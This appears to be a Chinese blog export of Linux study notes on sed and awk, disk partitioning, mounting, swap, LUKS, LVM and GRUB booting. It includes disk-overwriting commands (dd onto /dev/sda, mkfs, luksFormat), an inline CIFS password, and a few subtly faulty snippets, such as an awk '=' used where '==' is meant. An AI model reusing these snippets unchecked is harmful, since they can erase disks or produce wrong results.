流编辑器格式: sed 参数 &quot;表达式&quot; [操作文件]... 基本格式包含以下部分： 1. 指定范围，不明确指定的话，默认是所有的行，可以是行号，或者正则表达式 2. 指定动作，常用的有d, s, p, i, a d: delete, 删除 s: substitute, 替换 p: print, 打印 i: insert, 在前面插入 a: append, 在后面添加 选项: -e 表达式 -n 取消非匹配行的文件输出 -i 操作原文件(慎用) -r 支持更多正则表达式 () 域, 匹配子表达式，用于替换引用 第一个小括号对应\\1来引用 第二个小括号对应\\2来引用 ... 以此类推 有-r参数， 小括号不需要转义, 没有-r参数需要转义 \\(...\\) 输出 p(PPP15) 输出第3行内容 sed -n '3p' /etc/passwd 输出第3行和第7行内容，中间为;表示单独的操作 sed -n '3p;7p' /etc/passwd 输出第3行到第5行和第7行内容，中间为逗号，表示范围 sed -n '3,5p;7p' /etc/passwd 输出有root关键词的行 sed -n '/root/p' /etc/passwd 输出以root开头的行 sed -n '/^root/p' /etc/passwd 输出有数字的行 sed -n '/[0-9]/p' /etc/passwd 打印非空格开头的行 sed -n '/^[^[:blank:]]/p' passwd 或 sed -n '/^[^\\ ]/p' passwd 增加 i a (PPP16) 在第2行的上面， 也就是第2行加上一行内容 sed -i '2i sfasdfdsf' passwd 在第2行的下面， 也就是在第3行加一行内容 sed -i '2a sfasdfdsf' passwd i和a的区别: i是指定几行就在几行加， a是指定几行就在几行的下一行加 删除 d 删除第3行 sed '3d' mypasswd 删除第10行到第30行 cat -n /etc/passwd | sed '10, 30d' 删除第3行, 影响原文件 sed -i '3d' mypasswd 删除第二行到第三行 cat -n passwd | sed -e '2,3d' 删除第一行和第五行 cat -n passwd | sed -e '1d;5d' 删除空行 cat passwd | sed -e '/^$/d' 删除空格开始的行 cat /etc/passwd |sed -e '/^[[:blank:]]/d' --删除以空格开头的 cat /etc/passwd |sed -e '/^ /d' --同上 cat /etc/passwd |sed -e '/^\\ /d' --同上 删除/etc/passwd的空行和注释 cat passwd |sed -e '/^#/d;/^$/d' ... 删除一个字符串中指定位置的字符(PPP17) 删除第3至第5的字符 echo 123456789ABCDEF | sed -r 's/^(..)...(.*)$/\\1\\2/' 保留第1小括号和第2个的内容 删除第3个字符 echo 123456789ABCDEF | sed -r 's/^(.{2}).(.*)$/\\1\\2/' 删除从3个字符开始的10个字符 echo 123456789ABCDEF | sed -r 's/^(.{2}).{10}(.*)$/\\1\\2/' 替换 s(PPP18)(PPP19) 将每行的第一个root替换成soul sed -e 's/root/soul/' mypasswd 将每行的第二个root替换成soul sed -e 's/root/soul/2' mypasswd 将每行的所有root替换成soul sed -e 's/root/soul/g' mypasswd 将每行的开头的空格删掉 cat -n /etc/passwd | sed -e 's/^[ ]*//g' 将1到10行的所有root替换成soul sed -e '1,10s/root/soul/g' mypasswd 将10到最后行的所有root替换成soul sed -e '10,$s/root/soul/g' mypasswd 将10到最后行的所有小写字母替换K sed -e '10,$s/[a-z]/K/g' mypasswd 删除每行中第一个字符 sed -e &quot;s/^.//&quot; mypasswd 将每行中第一个字符替换成A sed -e &quot;s/^./A/&quot; mypasswd 删除每行中第二个字符 sed -r -e &quot;s/^(.)./\\1/&quot; mypasswd 删除每行中第一个有效字符(非空白字符) sed -e &quot;s/^([[:blank:]]*)./\\1/&quot; mypasswd 或者 sed -r -e 's/^([ ]*)./\\1/' mypasswd 删除每行最后一个字符 sed -e 's/.$//' mypasswd 从左边开始数左小括号(openning brace)，数字从1开始，被第一对括号匹配的字符 可以用\\1 来引用，第二对可以用\\2 来引用，以此类推。 删除每行倒数第二个字符 sed -r -e 's/.(.)$/\\1/' mypasswd 把倒数第一个和倒数二个换成了倒数第一个 删除每行的第二个数字 sed -r -e 's/[0-9]+//2' passwd 练习: 2018-9-24 2018-12-1 2018-1-4 2018-10-1 把上面的日期格式替换成2018-10-01的形式 删除每行第二个单词([a-zA-Z]+) sed -re 's/^([a-Z]+)([^a-Z])([a-Z]+)/\\1\\2/' 1_passwd.txt 或者 sed -re 's/[a-Z]+//2' 1_passwd.txt 删除每行第3个非单词 sed -re 's/[^a-Z]+//3' 1_passwd.txt PPP20 PPP21 查找有线网卡设备名 ifconfig | sed -rn 's/^(e[0-9a-zA-Z]+).*$/\\1/p' 截取IP地址(一行命令) 输出结果格式: 192.168.0.183/255.255.255.0 #!/bin/bash # 再脚本运行的进程里，把语言环境改成英文，就不会受到语言环境的影响 export LANG=en_US.UTF-8 export LANGUAGE=en_US:en # 截取出正在上网的网卡名称 link=$(route -n | sed -n '/UG/p' | sed -re 's/(.*)(\\b[a-Z0-9]+$)/\\2/') 或者 link=$(route -n | sed -n '/UG/p' | awk '{print $NF}') # 截取出ip和子网掩码， 用/分开 ip=$(ifconfig $link | sed -n '/Mask/p' | sed -r 's/^([^0-9]+)([0-9.]+)(.*)([^0-9.]+)([0-9.]+$)/\\2\\/\\5/') echo $ip AwkAwk是一门编程语言，有很多版本，我们用的是GNU的gawk 以:为分隔符打印第三列 awk -F &quot;:&quot; '{print $3}' /etc/passwd awk 命令的基本格式为： awk [选项] ‘脚本命令’ 文件名 此命令常用的选项以及各自的含义，如表 1 所示。 选项 含义 -F fs 指定以 fs 作为输入行的分隔符，awk 命令默认分隔符为空格或制表符。 -f file 从脚本文件中读取 awk 脚本指令，以取代直接在命令行中输入指令。 -v var=val 在执行处理过程之前，设置一个变量 var，并给其设备初始值为 val。 awk 的强大之处在于脚本命令，它由 2 部分组成，分别为匹配规则和执行命令，如下所示： 1'匹配规则{执行命令}' 这里的匹配规则，和 sed 命令中的 address 部分作用相同，用来指定脚本命令可以作用到文本内容中的具体行，可以使用字符串（比如 /demo/，表示查看含有 demo 字符串的行）或者正则表达式指定。另外需要注意的是，整个脚本命令是用单引号（’’）括起，而其中的执行命令部分需要用大括号（{}）括起来。 在 awk 程序执行时，如果没有指定执行命令，则默认会把匹配的行输出；如果不指定匹配规则，则默认匹配文本中所有的行。 举个简单的例子： 1awk '/^$/ {print &quot;Blank line&quot;}' test.txt 在此命令中，/^$/ 是一个正则表达式，功能是匹配文本中的空白行，同时可以看到，执行命令使用的是 print 命令，此命令经常会使用，它的作用很简单，就是将指定的文本进行输出。因此，整个命令的功能是，如果 test.txt 有 N 个空白行，那么执行此命令会输出 N 个 Blank line。 awk 使用数据字段变量awk 的主要特性之一是其处理文本文件中数据的能力，它会自动给一行中的每个数据元素分配一个变量。 默认情况下，awk 会将如下变量分配给它在文本行中发现的数据字段： $0 代表整个文本行； $1 代表文本行中的第 1 个数据字段； $2 代表文本行中的第 2 个数据字段； $n 代表文本行中的第 n 个数据字段。 前面说过，在 awk 中，默认的字段分隔符是任意的空白字符（例如空格或制表符）。 在文本行中，每个数据字段都是通过字段分隔符划分的。awk 在读取一行文本时，会用预定义的字段分隔符划分每个数据字段。 所以在下面的例子中，awk 程序读取文本文件，只显示第 1 个数据字段的值： 12345678[root@localhost ~]# cat data2.txtOne line of test text.Two lines of test text.Three lines of test text.[root@localhost ~]# awk '{print $1}' data2.txtOneTwoThree 该程序用 $1 字段变量来表示“仅显示每行文本的第 1 个数据字段”。当然，如果你要读取采用了其他字段分隔符的文件，可以用 -F 选项手动指定。 awk 脚本命令使用多个命令awk 允许将多条命令组合成一个正常的程序。要在命令行上的程序脚本中使用多条命令，只要在命令之间放个分号即可，例如： 12 echo &quot;My name is luke&quot; | awk '{$4=&quot;yichen&quot;; print $0}'My name is yichen 第一条命令会给字段变量 $4 赋值。第二条命令会打印整个数据字段。可以看到，awk 程序在输出中已经将原文本中的第四个数据字段替换成了新值。 除此之外，也可以一次一行地输入程序脚本命令，比如说： 12345[root@server1 ~]# awk '{&gt; $4=&quot;yichen&quot;&gt; print $0}'My name is lukeMy name is yichen 在你用了表示起始的单引号后，bash shell 会使用 &gt; 来提示输入更多数据，我们可以每次在每行加一条命令，直到输入了结尾的单引号。 注意，此例中因为没有在命令行中指定文件名，awk 程序需要用户输入获得数据，因此当运行这个程序的时候，它会一直等着用户输入文本，此时如果要退出程序，只需按下 Ctrl+D 组合键即可。 awk从文件中读取程序跟 sed 一样，awk 允许将脚本命令存储到文件中，然后再在命令行中引用，比如： 1234567891011121314cat awk.sh{print $1 &quot;'s home directory is &quot; $6}awk -F: -f awk.sh /etc/passwdroot's home directory is /rootbin's home directory is /bindaemon's home directory is /sbinadm's home directory is /var/admlp's home directory is /var/spool/lpd...Christine's home directory is /home/ChristineSamantha's home directory is /home/SamanthaTimothy's home directory is /home/Timothy awk.sh 脚本文件会使用 print 命令打印 /etc/passwd 文件的主目录数据字段（字段变量 $6），以及 userid 数据字段（字段变量 $1）。注意，在程序文件中，也可以指定多条命令，只要一条命令放一行即可，之间不需要用分号。 awk BEGIN关键字awk 中还可以指定脚本命令的运行时机。默认情况下，awk 会从输入中读取一行文本，然后针对该行的数据执行程序脚本，但有时可能需要在处理数据前运行一些脚本命令，这就需要使用 BEGIN 关键字。 BEGIN 会强制 awk 在读取数据前执行该关键字后指定的脚本命令，例如： 12345678910[root@localhost ~]# cat data3.txtLine 1Line 2Line 3[root@localhost ~]# awk 'BEGIN {print &quot;The data3 File Contents:&quot;}\\&gt; {print $0}' data3.txtThe data3 File Contents:Line 1Line 2Line 3 可以看到，这里的脚本命令中分为 2 部分，BEGIN 部分的脚本指令会在 awk 命令处理数据前运行，而真正用来处理数据的是第二段脚本命令。 awk END关键字和 BEGIN 关键字相对应，END 关键字允许我们指定一些脚本命令，awk 会在读完数据后执行它们，例如： 12345678[root@localhost ~]# awk 'BEGIN {print &quot;The data3 File Contents:&quot;}\\&gt; {print $0}\\&gt; END {print &quot;End of File&quot;}' data3.txtThe data3 File Contents:Line 1Line 2Line 3End of File 可以看到，当 awk 程序打印完文件内容后，才会执行 END 中的脚本命令。 以:为分隔符统计/sbin/nologin有多少个 awk 'BEGIN{FS=&quot;:&quot; ;count=0}{if($7 = &quot;/sbin/nologin&quot;)count+=1}END{print count}' /etc/passwd BEGIN 在读记录之前执行 END 在读完记录后再执行 $0 代表所有记录 $1-n 代表一个记录的第n个字段 使用awk脚本 #!/bin/awk BEGIN{ FS=: count=0 定义变量 } { if($7 == &quot;/sbin/nologin&quot;) { count += 1 print $0 } } END{ print &quot;count=&quot;count } awk -f 1.awk /etc/passwd 运行上面的脚本 FNR 当前处理到第几个文件 NF 当前多少个字段 NR 多少行 OFS 输入指定字段分隔符 ORS 输出记录分隔符 FS 指定分隔符 tips: awk没有指定分隔符的话， 就是默认以&quot;空格&quot;为分隔符 打印所有行, 以空格为分隔符 awk '{ print $0 }' /etc/passwd 打印第一列，以：为分隔符 awk -F &quot;:&quot; '{print $1}' /etc/passwd 打印每行的最后一列 awk -F : '{print $NF}' /etc/passwd 打印第一列和第三列, 并且加上welcome awk -F &quot;:&quot; '{print $1 &quot;\\t&quot; $3 &quot;welcome&quot;}' /etc/passwd 打印第八行 awk -F : '{if (NR == 8){print $0}}' /etc/passwd awk -F : 'NR == 8 {print $0}' /etc/passwd 打印行总数 awk -F : 'END{print NR}' /etc/passwd 打印每行的字段数 awk -F : '{print NF}' /etc/passwd 打印最后一行的最后一列 awk -F : 'END{print $NF}' /etc/passwd 打印字段数大于4的行 awk -F : 'NF &gt; 4 {print $0}' /etc/passwd 打印文件里所有字段总数 awk -F : 'BEGIN{c = 0}{c=c+NF}END{print c}' /etc/passwd 打印uid在30~40范围内的用户名 awk -F : '$3 &gt;= 30 &amp;&amp; $3 &lt;= 40{print $1}' /etc/passwd 打印5到56行 awk -F : 'NR &gt;= 5 &amp;&amp; NR &lt;= 56 {print $0}' /etc/passwd 打印偶数行 awk '{if (NR % 2 == 0)print $0}' /etc/passwd 打印偶基数行 awk '{if (NR % 2 == 1)print $0}' /etc/passwd 打印每行的第一单词 awk 'BEGIN{FS=&quot;[^A-Za-z]+&quot;}{print $1}' /etc/passwd 打印每行的第一个和第三个单词 awk 'BEGIN{FS=&quot;[^a-zA-Z]+&quot;}{print $1,$3}' /etc/passwd 打印字段数大于5个的行总数 awk -F &quot;:&quot; 'BEGIN {count=0 }(NF &gt; 5){count+=1} END{print count}' /etc/passwd","link":"/2020/08/03/linux_shell%E7%BC%96%E7%A8%8B/"},{"title":"linux磁盘管理","text":"磁盘管理存储设备(块设备)的管理(硬盘 移动硬盘 U盘 光盘 软盘 阵列...) 块设备操作流程: 分区 格式化(文件系统格式) 挂载 fdisk 用于管理磁盘的分区。 编辑分区表是危险操作，操作不当的话会造成无法访问分区，使数据丢失（数据还在磁盘上，并没有真正丢失，但是想访问它很难），一个安全的做法是先备份分区表到别的存储设备，然后再修改，这样就可以随时恢复原来的分区表 sudo fdisk -l /dev/sda &lt;-- 列出块设备/dev/sda上面的分区表 备份分区表，以下方法任何一个都可以 1. 连同启动加载程序一起备份 head -c 512 /dev/sda &gt; /some/where/boot_sector.bin 2. 仅仅备份分区表 head -c 510 /dev/sda | tail -c 64 &gt; /some/where/partition_table.bin 恢复分区表(慎用) dd if=./mbr.txt of=/dev/sda bs=1 count=512 查看磁盘信息从整体的角度上，硬盘接口分为IDE、SATA、SCSI和光纤通道四种，IDE接口硬盘多用于家用产品中，也部分应用于服务器，SCSI接口的硬盘则主要应用于服务器市场，而光纤通道只在高端服务器上，价格昂贵。SATA是种新生的硬盘接口类型， sudo fdisk -l 设备文件 /dev/sda sda 主机的第一块SATA硬盘 s 硬盘类型(硬盘接口: SATA IDE virtio 磁盘) SATA,U盘,移动硬盘 s IDE h virtio 半虚拟化磁盘 v d 存储设备 a 第一个块同类型的硬盘 . e 第五块同类型的硬盘 sdb 主机的第二块SATA硬盘 hda 主机的第一块IDE硬盘 vda 主机的第一块virtio 磁盘 sda1 主机的第一块SATA硬盘的第一个分区 sda2 主机的第一块SATA硬盘的第二个分区 分区表 (MBR/GPT) BIOS -&gt; MBR -&gt; fdisk(mbr分区管理工具) UEFI -&gt; GPT -&gt; gdisk(gpt分区管理工具) mbr是现在最流行的一个分区模式 gpt是以后的主流 最大的区别: mbr稳定性高 gpt能使用2T以上的硬盘, 而mbr不行 MBR 分区表规则 硬盘的第一个逻辑块(扇区)用于存储MBR信息(512字节) MBR(512) = 启动代码 + 分区表(64) 分区表(64字节) 一个分区信息占16字节, 最后可分4个分区, 称为主分区 扩展分区, 占用一个主分区位，用于扩展分区信息 逻辑分区, 在扩展分区内再继续划分的分区 个人分区方案(MBR) 第一个主分区 50G windows C盘 第二个主分区 50G 黑苹果系统分区 第三个主分区 4G boot分区 第四个主分区 扩展分区 第一个逻辑分区 4G 交换分区 第二个逻辑分区 50G linux的家目录(/home) 个人数据存储 第三个逻辑分区 30G 主linux系统的根分区(ubuntu) 第四个逻辑分区 20G 从linux系统的根分区(centos) 第五个逻辑分区 20G 测试linux系统的根分区 .. 最后一个逻辑分区 剩于空间 windows D盘 个人分区方案(GPT) 第一个分区 4G ESP分区(boot分区) 第二个分区 1M 兼容分区(BIOS) 第三个分区 50G windows 7 C盘 第四个分区 4G 交换分区 第五个分区 50G linux的家目录(/home) 个人数据存储 第六个分区 30G 主linux系统的根分区(ubuntu) 第七个分区 20G 从linux系统的根分区(centos) 第八个分区 20G 测试linux系统的根分区 ... 最后一个分区 剩于空间 windows D盘 个人分区方案(GPT + LVM) 第一个分区 4G ESP分区(boot分区) 第二个分区 1M 兼容分区(BIOS) 第三个分区 50G windows 7 C盘 第四个分区 100G LVM 设置分区方案 第一个分区 30G cenots根分区 83 第二个分区 30G windows C盘 7 第三个分区 4G boot分区 83 第四个分区 扩展分区 第一个逻辑分区 4G 交换分区 82 第二个逻辑分区 50G /home 83 第三个逻辑分区 30G ubuntu 83 第四个逻辑分区 20G mint 83 ... 最后逻辑分区 剩于空间 windows D盘 7 分区管理 sudo fdisk /dev/sda 进入分区管理的交互界面 l 列出已知分区类型 m 获取帮助 p 打印分区表 d 删除分区 q 退出 w 写入mbr n 新建分区 询问扩展分区(e)还是主分区(p) (还有主分区位才会询问) 选择扩展分区才要将剩于空间全部占完 询问占用主分区位(必须选择默认值) 访问新建分区的起始逻辑块(必须选择默认值) 访问新建分区的结束逻辑块, 标识此分区的大小, 建议: +30G t 修改分区类型 询问修改哪个分区的类型 询问修改哪个类型 (L 可以查找分区类型, 再输入对应ID) 创建扩展分区后，还需要创建逻辑分区，选择L 这样后面才可以格式化创建文件系统 Partition type: p primary (1 primary, 1 extended, 2 free) l logical (numbered from 5) ​​ 保存分区表之后，设备文件并没有对应生成, 生成对应的设备文件:​ 方法一: reboot​ 方法二: sudo partprobe​​ 创建文件系统​ 文件系统是用来管理文件的系统，在文件系统里面，数据以文件的形式。​ 不过，存取磁盘里的数据，不一定需要文件系统，像swap 设备就没有文件系统。​ 创建文件系统就是常说的：分区格式化 mkfs 格式化boot分区: mkfs -t ext2 /dev/sda3 格式化windows C盘 mkfs.vfat /dev/sda2 或 mkfs.ntfs /dev/sda2 (很慢) windows下的文件系统fat32在linux里被识别为vfat / /boot 都是xfs文件系统 目前一般用xfs文件系统 centos 7 xfs centos 6 ext4 centos 5 ext3 格式化home分区 mkfs.ext4 /dev/sdb1 格式化逻辑分区xfs文件系统 mkfs.xfs /dev/sdb5 挂载 mount 查看当前挂载情况 mount 挂载源 on 挂载目标 type 挂载类型 (挂载选项) df -h 查看简单的挂载信息 命令选项 -t 指定挂载文件系统类型, 自动识别(可以省略) -o 指定挂载选项(因为有默认选项, 所以也可省略) 挂载选项 (挂载选项可写多个，以逗号分隔) ro 只读 rw 可读可写(默认) remount 重新挂载 bind 绑定目录 loop 使用loop块设备 noauto 不开机自动挂载 挂载 将ext2文件系统格式分区挂载到/disk/boot mount -t ext2 -o rw /dev/sda3 /disk/boot 将vfat文件系统格式分区挂载到/disk/C mount -t vfat /dev/sda2 /disk/C 将ntfs文件系统格式分区挂载到/disk/D mount.ntfs-3g /dev/sda2 /disk/D 安装ntfs-3g 支持NTFS格式的磁盘， sudo wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo sudo yum install ntfs-3g -y 将网络文件系统挂载到/mnt mount -t nfs 192.168.0.183:/soul /mnt 将iso镜像文件挂载到/mnt mount -t iso9660 -ro loop /soul/images/centos.iso /yum 将/soul绑定到/mnt(访问/mnt即访问/soul) mount -o bind /soul /mnt 将windos的共享文件挂载到linux中 启用smb服务。在控制面板-&gt;程序和功能-&gt;启动或关闭windows更能中勾选SMB的相关项，之后重启电脑即可 mount -t cifs //172.17.46.192/相关镜像文件2 /win/ -o user=Administrator,password=zx.yes 重新挂载 mount -o remount,rw /dev/sda1 或 mount -o remount,rw / 取消挂载(PPP2) umount /mnt umount /dev/sda3 强制取消挂载 umount -l /mnt 交换分区 swap的作用和配置方法 内存不够用时，才会使用swap 设备 查看内存和交换分区的使用量 free -m fdisk -l 查看交换分区的磁盘位置 /dev/sda2 526336 4720639 2097152 82 Linux swap / Solaris 停用交换分区 swapoff /dev/sda2 启用交换分区 swapon /dev/sda2 格式化交换分区 需要把交换分区停了才能格式化 mkswap /dev/sda2 linux的内存机制是先缓存大量的数据，看上去的系统在占用大量的内存， 但是 这个只是linux系统的一种缓存机制， 加速下次的访问速度， 只要没有使用 交换分区就代表内存没有被全部消耗 测试系统消耗内存的好处 生成一个1G的大文件 dd if=/dev/zero of=2_2G.txt bs=1M count=1024 清空缓存 echo &quot;3&quot; | sudo tee /proc/sys/vm/drop_caches 读取此文件并测试所消耗的时间： time cat 2_2G.txt &gt; /dev/null real 0m4.477s user 0m0.008s sys 0m0.620s 使用的时间是4.47S 读取此文件并测试所消耗的时间： time cat 2_2G.txt &gt; /dev/null real 0m0.163s user 0m0.002s sys 0m0.160s 再次读取的时间是0.163S 开机自动挂载配置文件 /etc/fstab UUID=db6a4392-ccb0-41af-863f-4de76cad1c0a / ext4 errors=remount-ro 0 1 UUID=67a2f488-1421-495a-ada1-dc022c29d77d none swap sw 0 0 挂载源 挂载目标 文件系统格式 挂载选项 dump备份 开机自检 UUID=96A4-6194 /disk/C vfat defaults 0 0 UUID=51c35f8c-c9dd-498e-9f05-203d6f931fa6 /disk/boot ext2 defaults 0 0 UUID=c9edda7d-dbc2-443a-81a4-5a729fc9b27a none swap sw 0 0 /disk/ubuntu-16.04.4-server-amd64.iso /opt iso9660 loop,ro 0 0 挂载/etc/fstab配置里所有挂载条目: mount -a UUID: 分区唯一标识符 设备名称会因硬盘变动而发生改变(删除中间分区 添加硬盘等) 分区只要不格式化， 此分区UUID绝对唯一， 不会冲突 查看块设备的UUID: sudo blkid /dev/sda{1..2} /dev/sda1: UUID=&quot;0d1c509a-28d7-4f86-a900-ec04174a2613&quot; TYPE=&quot;xfs&quot; /dev/sda2: UUID=&quot;H2FW0i-snFz-Kmn7-gQp6-XZ6e-Nm2z-I1PEhV&quot; TYPE=&quot;LVM2_member&quot; 查看已挂载磁盘使用情况: df -h 树型结构查看所有硬盘分区表: lsblk 生成指定大小的空文件 head -c 1G /dev/zero &gt; swapfile dd if=/dev/zero of=./swapfile bs=1024 count=1024 加密分区 安装: sudo yum install cryptsetup* -y(基本都已经安装好的) 创建加密分区 得是一个新创建的分区, 正在使用或者使用过的分区不能加密 sudo cryptsetup luksFormat /dev/sdb5 询问是否继续的时候要输入YES, yes/y 小写不行，会终止 输入加密分区的密码, 不能忘记，忘记的话加密分区就无法再访问 不能少于8个字符,也不能太简单 解密分区 (生成解密后的设备文件) sudo cryptsetup luksOpen /dev/sdb5 soul 输入加密分区的密码 这里的soul为自定义 首次使用先格式化加密后的分区 sudo mkfs -t ext4 /dev/mapper/soul 挂载加密分区 sudo mount /dev/mapper/soul /mnt 对/mnt进行操作即是对加密分区进行操作 取消挂载的加密分区 sudo umount /dev/mapper/soul 取消解密分区(释放解密后的设备文件) sudo cryptsetup luksClose soul 取消解密分区后，如果想要再次挂载 /dev/sdb5 这个磁盘分区， mount /dev/sdb5 /mnt 就挂载不了了。 只能先解密分区 （或者重新强制格式化，mkfs.xfs /dev/sdb5 -f ） cryptsetup luksOpen /dev/sdb5 server1 再次挂载加密分区 mount /dev/mapper/server1 /mnt 这时候会发现之前soul分区的内容还在，因为没有格式化 取消挂载的加密分区 umount /dev/mapper/server1 当我们用完我们的加密分区后，就可以卸载它然后再锁住，这样数据就又会保护起来 我们要先卸载我们挂上去的分区，然后再锁住，如果不能锁住，可以尝试下把挂载目录删了 分区方案: /dev/sda1 30G / linux /dev/sda2 4G swap /dev/sda3 4G /boot linux /dev/sda4 1K extend /dev/sda5 50G ubuntu lvm /dev/sda6 50G min-centos lvm /dev/sda7 50G mint lvm LVM LVM是Linux下对磁盘空间管理的一种方法(动态扩容/缩减空间) 安装LVM: sudo yum install lvm2 -y 物理卷(PV) 对应 硬盘分区 块设备 创建pv之前要对分区进行格式化 创建 pvcreate sudo pvcreate /dev/sdb5 查看物理卷简单信息 sudo pvs 查看物理卷稍微详细一点的信息 sudo pvscan 查看物理卷的详细信息 sudo pvdisplay 更改 sudo pvchange 删除 sudo pvremove 卷组(VG) 用于管理物理卷 最好不要给/目录扩容，到时候锁减不行，因为目录一直在使用中，除非取消挂载， 创建 vgcreate sudo vgcreate 卷组名 物理卷设备路径... 查看 vgs vgscan vgdisplay 删除 vgremove 卷组名 更改 vgchange vgextend 扩容卷组(增加物理卷) sudo vgextend vg1 /dev/sdb5 缩减卷组(减少物理卷) sudo vgreduce vg1 /dev/sdb5 逻辑卷(LV) 在卷组之上划分 分区 创建 lvcreate sudo lvcreate --name 逻辑卷名 --size 10G 卷组名 查看 lvs lvscan lvdisplay 删除 lvremove 更改 lvchange lvextend 扩容(lvextend) 逻辑卷的大小一定要小于或者等于物理卷的大小 第一步: 给home逻辑卷加10G空间 lvresize -L +10G /dev/vg1/lv1 第二步: 扩大文件系统的显示 resize2fs /dev/vg1/lv1 两步可以合成一步完成: lvresize -r -L +10G /dev/vg1/lv1 这时候家目录就已经增加了容量了 缩减 (lvreduce) 必须先取消挂载, 并且缩减剩于空间足够 lvresize -r -L -10G /dev/vg1/lv1 首先把硬盘分区或者整块硬盘标记为一个物理卷(PV), 然后再创建一个卷组(VG), 把一个或多个物理卷加入卷组，最后对卷组进行分区， 每一个分区称为一个逻辑卷（LV）。 一、实施LVM存储 1、进入交互式界面后，创建新分区 1#fdisk /dev/sdb 2、创建物理卷（pv） 1#pvcreate /dev/sdb5 可使用pvs、pvdisplay查看 3、创建卷组（vg） 1#vgcreate vg1 /dev/sdb5 可使用vgs、vgdisplay查看 4、创建逻辑卷（lv） 1#lvcreate -n lv1 vg1 -L 5G 可使用lvs、lvdisplay查看 5、建立文件系统 根据需要创建不同类型的文件系统，例如ext4 123456#mkfs.ext4 /dev/vg1/lv1 #mkdir /data //根下创建挂载目录配置文件/etc/fstab中追加/dev/vg1/lv1 /data ext4 defaults 0 0 //永久挂载#mount -a //重新加载#df -h //查看有没有挂载成功 二、 删除逻辑卷 1、卸载挂载点 1#umount /data 2、删除逻辑卷 1#lvremove /dev/vg1/lv1 3、删除卷组 1#vgremove vg1 4、删除物理卷 1#pvremove /dev/sdb5 三、扩展和缩减卷组 假如vg容量不够，需要新建分区-创建物理卷-扩展卷组 1234#fdisk /dev/sdb //创建分区#pvcreate /dev/sdb6 //创建物理卷#vgextend vg1 /dev/sdb6 //扩展卷组#vgs //查看卷组大小 若想缩减卷组需要缩减卷组-缩减物理卷 12#vgreduce vg1 /dev/sdb6 #pvremove /dev/sdb6 四、扩展逻辑卷和文件系统 扩展逻辑卷后需根据文件系统类型进行扩展 123#lvextend /dev/vg1/lv1 -r -L +10G //将LV增加10G #xfs_growfs /dev/vg1/lv1 //xfs文件系统扩展方法#resize2fs /dev/vg1/lv1 //ext4文件系统扩展方法 启动管理mbr里的启动程序 - grub -&gt; bootloader程序(启动内核并且传参) centos7 -&gt; grub2 ubuntu -&gt; grub windows -&gt; grub4dos grub配置文件: /boot/grub2/grub.cfg grub识别分区 hd0 代表第一块硬盘 hd0,msdos1 代表第一块硬盘的第一个分区 hd1,gpt2 代表第二块硬盘的第二个分区 第一块硬盘的第三个分区中boot目录的vmlinuz文件的grub路径 (hd0,msdos3)/boot/vmlinuz grub命令 set 设置grub环境变量 设置菜单等待显示风格(hidden代表隐藏) set timeout_style=menu 设置菜单等待时间 (秒) set timeout=30 设置grub环境的根分区 set root='hd0,msdos1' 如果设置了root环境变量, 访问第一块硬盘第一个分区boot目录下vmlinuz文件的路径 /boot/vmlinuz 设置grub默认进入操作系统条目 set default=2 menuentry 创建菜单项 menuentry 'My Menu Options' { ... } linux 启动哪个内核 initrd 启动哪个临时文件系统 boot 启动系统 (grub命令行) 启动ubuntu系统的菜单的grub配置内容 menuentry 'Ubuntu16.04.4' { set root='hd0,msdos1' linux /boot/vmlinuz-4.4.0-116-generic root=/dev/sda1 initrd /boot/initrd.img-4.4.0-116-generic } 或 menuentry 'Ubuntu16.04.4' { linux (hd0,msdos1)/boot/vmlinuz-4.4.0-116-generic root=/dev/sda1 initrd (hd0,msdos1)/boot/initrd.img-4.4.0-116-generic } grub配置文件错误或丢失的效果, 开机进入提示 grub&gt; 命令行: set root=(hd0,1) linux /boot/vmlinuz-4.4.0-130-generic root=/dev/sda1 输入linux /boot/vmlinuz-再按TAB补全文件 initrd /boot/initrd.img-4.4.0-130-generic boot grub模块目录丢失的效果, 开机进入提示 grub-rescue&gt; 命令行: 前提: 已知grub目录在第一块硬盘的第一个分区下 set prefix=(hd0,1)/grub 设置grub程序根目录(模块根目录) set root=(hd0,1) 设置grub环境的默认根分区, 设置/对应位置 insmod normal 导入normal核心模块(菜单选项代码) normal 运行normal模块代码, 运行成功后进入grub菜单 centos系统上硬盘安装centos (依赖Lvm分区方案)前提工作: sudo cp /soul/images/centos.iso / sudo cp /yum/isolinux/vmlinuz /yum/isolinux/initrd.img / /etc/grub2.cfg 追加内容: menuentry '----- CentOS 7 Install -----' { linux (hd0,1)/vmlinuz linux repo=hd:/dev/sda1:/ initrd (hd0,1)/initrd.img } 如果在grub命令行输入命令则不需要修改grub配置文件 grub命令行 grub&gt; linux (hd0,1)/vmlinuz linux repo=hd:/dev/sda1:/ grub&gt; initrd (hd0,1)/initrd.img grub&gt; boot 重启电脑进入grub菜单选择CentOS 7 Install菜单项按回车 进入CentOS7安装界面会让用户选择以什么方式安装(http ftp nfs cdrom hard) 选择硬盘安装 -&gt; 选择镜像文件所在分区(/dev/sda1) 注意: 选择安装的分区 ubuntu系统上硬盘安装mint19前提工作: sudo mount /dev/sda6 /disk/data sudo chown $USER:$USER /disk/data -R wget http://3.3.3.1/iso/linuxmint-19-cinnamon-64bit.iso -O /disk/data/mint19.iso 或 wget http://3.3.3.9/iso/mint19.iso -O /disk/data/mint19.iso mount -o loop,ro /disk/data/mint19.iso /mnt 重启电脑进入grub命令行 (grub菜单界面按c进入grub命令行) set root=(hd0,6) loopback loop /mint19.iso set root=(loop) linux /casper/vmlinuz boot=capser iso-scan/filename=/mint19.iso -- initrd /casper/initrd.lz boot 进入mint19的试用系统中 按ctrl + alt + t 打开终端输入: sudo umount -l /isodevice 点击桌面安装程序， 点击下一步, 其中进入分区选择 boot分区 --&gt; /dev/sda3 不要格式化 home分区 --&gt; /dev/up/home 不要格式化 mint根分区 --&gt; /dev/up/mint swap分区 --&gt; /dev/up/swap ubuntu系统上硬盘安装windows 7前提: 自己下载win7的ghost.gho文件, 复制到/dev/sda7(D盘)分区中 把ghost.img和memdisk文件复制到/dev/sda6分区 sudo mount /dev/sda6 /disk/data sudo mount 3.3.3.9:/kyo /mnt cp /mnt/tools/{ghost.img,memdisk} /disk/data/ 重启电脑进入grub命令行 set root=(hd0,6) linux16 /memdisk c=2000 h=4 s=36 floppy initrd16 /ghost.img boot 进入ghost程序将win7的gho文件还原到C盘(/dev/sda2) ghost完成之后再进入grub命令行 set root=(hd0,2) chainloader +1 boot /boot 存储启动相关文件 